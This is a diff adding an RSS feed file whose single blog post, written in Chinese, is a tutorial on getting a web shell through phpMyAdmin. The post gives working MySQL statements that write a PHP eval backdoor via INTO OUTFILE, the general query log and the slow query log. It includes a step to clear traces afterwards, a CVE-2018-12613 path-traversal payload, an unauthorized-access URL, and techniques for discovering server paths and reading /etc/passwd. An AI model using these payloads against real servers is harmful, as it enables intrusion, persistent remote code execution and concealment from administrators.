@@ -1,0 +1,127 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>月のブログ</title>
+        <subtitle>时光如白驹过隙</subtitle>
+        <icon>https://mo-onstudy.com/images/favicon.ico</icon>
+        <link>https://mo-onstudy.com</link>
+        <author>
+          <name>Moon</name>
+        </author>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Thu, 13 Jan 2022 10:41:37 +0800</pubDate>
+        <lastBuildDate>Thu, 13 Jan 2022 10:41:37 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/</guid>
+            <title>phpmyadmin后台getshell</title>
+            <link>https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/</link>
+            <category term="phpmyadmin" scheme="https://mo-onstudy.com/tags/phpmyadmin/" />
+            <category term="getsehll" scheme="https://mo-onstudy.com/tags/getsehll/" />
+            <pubDate>Thu, 13 Jan 2022 10:41:37 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;select-into-outfile写入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-into-outfile写入&#34;&gt;#&lt;/a&gt; select into outfile 写入&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用条件&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;对 web 目录需要有写权限能够使用单引号 (root)&lt;/li&gt;
+&lt;li&gt;知道网站绝对路径 (通过 phpinfo/php 探针 / 报错等)&lt;/li&gt;
+&lt;li&gt;secure_file_priv 没有具体值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用步骤&#34;&gt;#&lt;/a&gt; 利用步骤&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;# 查询secure_file_priv值
+show global variables like &#39;%secure%&#39;;
+
+# 写入shell
+select &#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39; INTO OUTFILE &#39;C:\\phpStudy\\WWW\\shell.php&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关于 secure_file_priv：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;  是用来限制 load dumpfile、into outfile、load_file () 函数在哪个目录下拥有上传或者读取文件的权限&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下，此时也无法提权&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;  这个值是只读变量，只能通过配置文件修改。如果管理员没有配置，无法进行写入 shell&lt;/p&gt;
+&lt;h2 id=&#34;全局日志写入shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局日志写入shell&#34;&gt;#&lt;/a&gt; 全局日志写入 shell&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用条件-2&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;必须是 root 权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用步骤-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用步骤-2&#34;&gt;#&lt;/a&gt; 利用步骤&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;# 查看配置
+SHOW VARIABLES LIKE &#39;%general%&#39;
+
+# 开启general_log模式
+set global general_log = on;
+
+# 设置日志目录
+set global general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39;;
+
+# 写入shell
+select &#39;&amp;lt;?php eval($_POST[cmd]);?&amp;gt;&#39;
+
+# 清除痕迹
+set global general_log_file=&#39;C:\\phpStudy\\MySQL\\data\\stu1.log&#39;;
+set global general_log = off;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;慢查询日志getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#慢查询日志getshell&#34;&gt;#&lt;/a&gt; 慢查询日志 getshell&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;记录所有执行时间超过 long_query_time 秒的所有查询或者不使用索引的查询。默认情况下，MySQL 数据库是不开启慢查询日志的，long_query_time 的默认值为 10（即 10 秒，通常设置为 1 秒），即运行 10 秒以上的语句是慢查询语句。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查询慢查询日志&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; variables &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%slow%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 启用慢查询日志&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GLOBAL&lt;/span&gt; slow_query_log&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 设置日志路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;slow_query_log_file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;C:/phpstudy_pro/WWW/2.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 写入 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php phpinfo() ?&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;db &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;其他漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞&#34;&gt;#&lt;/a&gt; 其他漏洞&lt;/h2&gt;
+&lt;h3 id=&#34;cve-2018-12613&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2018-12613&#34;&gt;#&lt;/a&gt; Cve-2018-12613&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;phpMyAdmin 4.8.1 和 4.8.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../windows/win.ini
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;cve-2016-5734&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-5734&#34;&gt;#&lt;/a&gt; Cve-2016-5734&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;4.0.10.16 之前的 4.0.x 版本&lt;/li&gt;
+&lt;li&gt;4.4.15.7 之前的 4.4.x 版本&lt;/li&gt;
+&lt;li&gt;4.6.3 之前的 4.6.x 版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;宝塔phpmyadmin未授权访问漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宝塔phpmyadmin未授权访问漏洞&#34;&gt;#&lt;/a&gt; 宝塔 phpmyadmin 未授权访问漏洞&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux 正式版 7.4.2 Linux 测试版 7.5.13 Windows 正式版 6.8&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;http://xxx.xxx.xxx.xxx:888/pma 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;绝对路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绝对路径&#34;&gt;#&lt;/a&gt; 绝对路径&lt;/h2&gt;
+&lt;h3 id=&#34;phpinfo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinfo&#34;&gt;#&lt;/a&gt; phpinfo&lt;/h3&gt;
+&lt;p&gt;F12 查看源代码然后搜索 DOCUMENT ROOT 得知写入的绝对路径&lt;/p&gt;
+&lt;h3 id=&#34;报错信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错信息&#34;&gt;#&lt;/a&gt; 报错信息&lt;/h3&gt;
+&lt;p&gt;通过各种 fuzz 尝试让目标报错，也有可能爆出绝对路径&lt;/p&gt;
+&lt;h3 id=&#34;集成web框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#集成web框架&#34;&gt;#&lt;/a&gt; 集成 web 框架&lt;/h3&gt;
+&lt;p&gt;如果目标站点是利用 phpstudy、LAMPP 等之类搭建的，可以通过查看数据库路径再拆解 web 路径&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;show variables like &#39;%datadir%&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;select-load_file&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-load_file&#34;&gt;#&lt;/a&gt; select load_file()&lt;/h3&gt;
+&lt;p&gt;利用 select load_file () 读取文件，可以尝试 /etc/passwd，apache｜nginx｜httpd log 之类的文件&lt;/p&gt;
+&lt;p&gt;Trick：如何判断目录是否存在，往往确定了 /var/www/html 目录，但是还有一层目录不能确定，可以采用目标域名 + 常用的网站根目录的方式进行爆破，当使用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select &#39;test&#39; into outfile &#39;/var/www/$fuzz$/shell.php&#39;；
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;时，目录 fuzz，fuzz 不存在将会报错&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Can&#39;t create/write to file &#39;/var/www/html/666.txt&#39; (Errcode: 2)；
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果存在但是目录写不进去将返回 (Errcode: 13)&lt;/p&gt;
+&lt;p&gt;如果使用的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;load data infile &amp;quot;/etc/passwd&amp;quot; into table test;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该语句执行后将也会显示文件是否存在，有权限能否写等信息。&lt;/p&gt;
+&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;查看数据库表内容获取 有一些 cms 会保存网站配置文件 或者路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;进入后台&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;百度出错信息 zoomeye shadon 搜索 error warning&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;@@datadir 参数看 mysql 路径 反猜绝对路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
